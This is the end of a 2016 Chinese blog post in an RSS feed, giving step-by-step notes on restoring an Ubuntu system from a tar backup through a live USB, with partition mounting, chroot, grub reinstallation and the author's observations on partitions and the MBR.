    尝试过不重装系统,自己用live-usb中的gparted分区再直接进行下面的还原过程,
    结果发现gparted分区时,会把mbr删除了,这样在下面的grub-install /dev/sda这一步会失败,显示没有找到mbr相关的信息,
    这样只能重新用live-usb自带的安装系统工具选择&quot;清除整个磁盘后安装&quot;,这种安装方式会自动将系统默认安装到一个分区(/,/boot都安装到/dev/sda1)

    实验中在live-usb中用自带的安装系统工具重新安装live-usb中的系统(为了新建分区表和重构mbr),支持改变分区,分区如下:
    /dev/sda1 对应分配给/boot(主分区) 20G
    /dev/sda5 对应分配给交换空间(逻辑分区) 32G=16(内存)x2
    /dev/sda6 对应分配给/(逻辑分区) 剩余空间

2&amp;gt;进live-cd
    sudo su -
    mkdir /mnt/tmp
    mount /dev/sda6 /mnt/tmp
    mount /dev/sda1 /mnt/tmp/boot
    rm -r /mnt/tmp/*
        这句执行后新安装系统的两个分区/dev/sda1,/dev/sda6依然存在,只是分区中的内容全部清空了,/mnt/tmp/boot中的内容会被清空,
        但是boot文件夹不会被rm删除掉,因为boot文件夹是被挂载的分区设备,
        blkid /dev/sda1和blkid /dev/sda6这两个命令查询分区的uuid发现rm -r /mnt/tmp/*后的结果与新系统安装后的结果一致,
        说明&quot;linux中,一切皆文件&quot;的说法不适用于分区表,也即分区表并不属于这里说的&quot;文件&quot;,mbr应该也不属于,
        也即rm -r /mnt/tmp/*命令不会把上面1中的重新安装系统新建的分区表和mbr删除
        之所以要rm -r * /mnt/tmp,是因为备份好的系统中安装了新的驱动,而用live-usb新安装的系统中的驱动如果不rm掉,
        会与备份好的系统中的驱动在一起导致还原后的系统出错
    tar xvpzf /media/ubuntu/files/ubuntubak.tgz -C /mnt/tmp
    cd /mnt/tmp
    mkdir proc lost+found mnt sys media root/.cache
    mount --bind /proc /mnt/tmp/proc
    mount --bind /sys /mnt/tmp/sys
    mount --bind /dev /mnt/tmp/dev
    chroot /mnt/tmp
    grub-install /dev/sda
    grub-mkconfig -o /boot/grub/grub.cfg
    vi /etc/fstab
        do as 0x01 does
    sync
    sync
    exit
    sync
    sync
    (这四个sync是为了保险起见,最好这样,实验中有一次没有sync导致还原后没有图形界面,只有命令行会话)
    umount /proc
    umount /sys
    umount /dev
    umount /mnt/tmp/boot
    umount /mnt/tmp
    (这五个umount可以不执行)
    shutdown -r 0


3&amp;gt;attention:
    /dev/sda6 为/目录对应的分区,安装完系统后/目录下的boot文件夹是空的,但是/dev/sda6中boot文件夹是存在的,
    由于新安装的系统在启动时会自动将/dev/sda1挂载到/目录下的boot上,所以新安装的系统开机后/boot里面是有文件的,
    但是/dev/sda6中的boot文件夹一直是空的,只不过由于新安装的系统启动后(相当于mount /dev/sda1 /boot),
    /boot被/dev/sda1占据了,这时/dev/sda6中的boot文件夹是被屏蔽的,无法访问的


&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Tue, 02 Aug 2016 00:00:00 +0800</pubDate>
        <link>/linux/2016/08/02/%E4%BF%AE%E5%A4%8Dlinux%E7%B3%BB%E7%BB%9F/</link>
        <guid isPermaLink="true">/linux/2016/08/02/%E4%BF%AE%E5%A4%8Dlinux%E7%B3%BB%E7%BB%9F/</guid>
        
        <category>linux</category>
        
        <category>修复系统</category>
        
        
        <category>linux</category>
        
      </item>
    
  </channel>
</rss>
